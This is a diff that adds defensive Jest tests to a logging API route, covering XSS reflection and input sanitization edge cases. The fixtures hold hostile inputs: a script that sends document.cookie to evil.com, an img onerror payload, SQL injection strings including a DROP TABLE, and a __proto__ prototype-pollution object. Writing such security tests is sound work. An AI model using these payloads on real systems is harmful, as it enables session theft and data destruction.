@@ -605,5 +605,266 @@ describe('Logs Routes', () => {
         'User action'
       );
     });
+
+    it('should NOT include client logs in response body (prevents XSS reflection)', async () => {
+      // Arrange - XSS payload in log message
+      const xssPayload = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'error',
+            message: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
+            context: {
+              payload: '<img src=x onerror=alert(1)>',
+            },
+          },
+        ],
+      };
+
+      // Act
+      const response = await request(app)
+        .post('/api/logs')
+        .send(xssPayload)
+        .expect(204);
+
+      // Assert - response body should be empty (204 No Content)
+      expect(response.text).toBe('');
+      expect(response.body).toEqual({});
+    });
+
+    it('should NOT reflect client data in validation error responses', async () => {
+      // Arrange - Malicious data in invalid payload
+      const maliciousPayload = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'invalid-level', // Invalid level to trigger validation error
+            message: '<script>alert("XSS")</script>',
+          },
+        ],
+      };
+
+      // Act
+      const response = await request(app)
+        .post('/api/logs')
+        .send(maliciousPayload)
+        .expect(400);
+
+      // Assert - error response should not include the malicious message
+      const responseText = JSON.stringify(response.body);
+      expect(responseText).not.toContain('<script>');
+      expect(responseText).not.toContain('alert("XSS")');
+    });
+  });
+
+  // ============================================
+  // Input Sanitization Edge Cases
+  // ============================================
+  describe('Input Sanitization Edge Cases', () => {
+    it('should handle null byte injection in message', async () => {
+      // Arrange
+      const nullByteLog = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'info',
+            message: 'Before\x00After', // Null byte
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(nullByteLog)
+        .expect(204);
+
+      // Assert - should process without error
+      expect(mockChildLogger.info).toHaveBeenCalled();
+    });
+
+    it('should handle control characters in message', async () => {
+      // Arrange
+      const controlCharsLog = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'warn',
+            message: 'Line1\r\nLine2\tTabbed\bBackspace',
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(controlCharsLog)
+        .expect(204);
+
+      // Assert
+      expect(mockChildLogger.warn).toHaveBeenCalled();
+    });
+
+    it('should handle timestamp in future (year 2099)', async () => {
+      // Arrange
+      const futureLog = {
+        logs: [
+          {
+            timestamp: '2099-01-01T00:00:00.000Z',
+            level: 'info',
+            message: 'Future log',
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(futureLog)
+        .expect(204);
+
+      // Assert - should accept (validation doesn't check date range)
+      expect(mockChildLogger.info).toHaveBeenCalledWith(
+        expect.objectContaining({
+          clientTimestamp: '2099-01-01T00:00:00.000Z',
+        }),
+        'Future log'
+      );
+    });
+
+    it('should handle SQL injection attempts in message', async () => {
+      // Arrange
+      const sqlInjectionLog = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'error',
+            message: "'; DROP TABLE users; --",
+            context: {
+              query: "SELECT * FROM users WHERE id = '1' OR '1'='1'",
+            },
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(sqlInjectionLog)
+        .expect(204);
+
+      // Assert - logs are text, SQL injection is not a concern here
+      expect(mockChildLogger.error).toHaveBeenCalledWith(
+        expect.any(Object),
+        "'; DROP TABLE users; --"
+      );
+    });
+
+    it('should handle prototype pollution attempts in context', async () => {
+      // Arrange
+      const prototypePollutionLog = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'info',
+            message: 'Prototype test',
+            context: {
+              '__proto__': { isAdmin: true },
+              'constructor': { prototype: { isAdmin: true } },
+            },
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(prototypePollutionLog)
+        .expect(204);
+
+      // Assert - should not affect Object prototype
+      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
+      expect(mockChildLogger.info).toHaveBeenCalled();
+    });
+
+    it('should handle extremely long userAgent (>500 chars)', async () => {
+      // Arrange
+      const longUserAgent = 'Mozilla/5.0 ' + 'x'.repeat(600);
+      const longUALog = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'debug',
+            message: 'Long UA test',
+            userAgent: longUserAgent,
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(longUALog)
+        .expect(204);
+
+      // Assert - should accept (no length validation on userAgent)
+      expect(mockChildLogger.debug).toHaveBeenCalled();
+    });
+
+    it('should handle circular reference in context (via JSON stringify)', async () => {
+      // Note: Express JSON body parser handles this - circular refs fail at parse
+      // This test verifies that valid deep nesting works
+      const deepContext = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'info',
+            message: 'Deep context',
+            context: {
+              level1: {
+                level2: {
+                  level3: {
+                    level4: {
+                      level5: { value: 'deep' },
+                    },
+                  },
+                },
+              },
+            },
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(deepContext)
+        .expect(204);
+
+      // Assert
+      expect(mockChildLogger.info).toHaveBeenCalled();
+    });
+
+    it('should handle logs with only whitespace message', async () => {
+      // Arrange
+      const whitespaceMessage = {
+        logs: [
+          {
+            timestamp: '2024-01-15T10:00:00Z',
+            level: 'info',
+            message: '   \t\n   ',
+          },
+        ],
+      };
+
+      // Act
+      await request(app)
+        .post('/api/logs')
+        .send(whitespaceMessage)
+        .expect(204);
+
+      // Assert - should accept whitespace-only messages
+      expect(mockChildLogger.info).toHaveBeenCalled();
+    });
   });
 });
